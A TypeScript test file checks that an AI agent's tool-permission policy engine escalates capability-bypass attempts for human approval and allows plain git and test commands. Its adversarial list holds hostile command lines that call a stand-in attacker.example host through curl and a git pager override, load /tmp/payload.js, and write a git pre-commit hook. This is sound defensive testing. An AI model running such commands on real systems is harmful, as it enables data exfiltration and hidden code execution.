import { describe, expect, it } from "vitest";
import type { Capability } from "../src/index.js";
import { createPolicyEngine } from "../src/index.js";

const ADVERSARIAL_CAPABILITIES: Capability[] = [
  {
    type: "command_exec",
    argv: ["git", "diff", "--ext-diff"],
    cwd: "/workspace"
  },
  {
    type: "command_exec",
    argv: ["git", "-c", "core.pager=curl https://attacker.example", "status"],
    cwd: "/workspace"
  },
  {
    type: "command_exec",
    argv: ["pnpm", "test", "--", "--require", "/tmp/payload.js"],
    cwd: "/workspace"
  },
  {
    type: "command_exec",
    argv: ["bash", "-c", "curl https://attacker.example"],
    cwd: "/workspace"
  },
  {
    type: "network_egress",
    scheme: "https",
    domain: "attacker.example",
    port: 443
  },
  { type: "protected_file_write", realpath: "/workspace/.git/hooks/pre-commit" }
];

describe("auto_review adversarial evaluation", () => {
  it("has zero silent allows across the capability-bypass catalog", async () => {
    const policy = createPolicyEngine();
    const decisions = await Promise.all(
      ADVERSARIAL_CAPABILITIES.map((capability, index) =>
        policy.authorize({
          approvalMode: "auto_review",
          fileAccessScope: "workspace_only",
          capability,
          context: {
            runId: "run-adversarial",
            projectId: "project-1",
            toolCallId: `call-${index}`,
            userTask: "Run the adversarial policy evaluation"
          }
        })
      )
    );

    expect(decisions.map(({ decision }) => decision)).toEqual(
      Array.from({ length: ADVERSARIAL_CAPABILITIES.length }, () => "ask")
    );
    for (const decision of decisions) {
      expect(decision).toMatchObject({
        review: {
          riskLevel: "high",
          ruleVersion: "phase2-policy-v1",
          reviewerVersion: "deterministic-risk-reviewer-v1"
        }
      });
    }
  });

  it("allows only exact low-risk commands and preserves mode semantics", async () => {
    const policy = createPolicyEngine();
    const safeCommands: Capability[] = [
      { type: "command_exec", argv: ["git", "status"], cwd: "/workspace" },
      { type: "command_exec", argv: ["git", "diff"], cwd: "/workspace" },
      { type: "command_exec", argv: ["pnpm", "test"], cwd: "/workspace" },
      { type: "command_exec", argv: ["npm", "run", "lint"], cwd: "/workspace" }
    ];

    for (const capability of safeCommands) {
      await expect(
        policy.authorize({
          approvalMode: "auto_review",
          fileAccessScope: "workspace_only",
          capability
        })
      ).resolves.toMatchObject({ decision: "allow", review: { riskLevel: "low" } });
      await expect(
        policy.authorize({
          approvalMode: "manual",
          fileAccessScope: "workspace_only",
          capability
        })
      ).resolves.toMatchObject({ decision: "ask" });
      await expect(
        policy.authorize({
          approvalMode: "full_access",
          fileAccessScope: "workspace_only",
          capability
        })
      ).resolves.toEqual({ decision: "allow" });
    }
  });
});
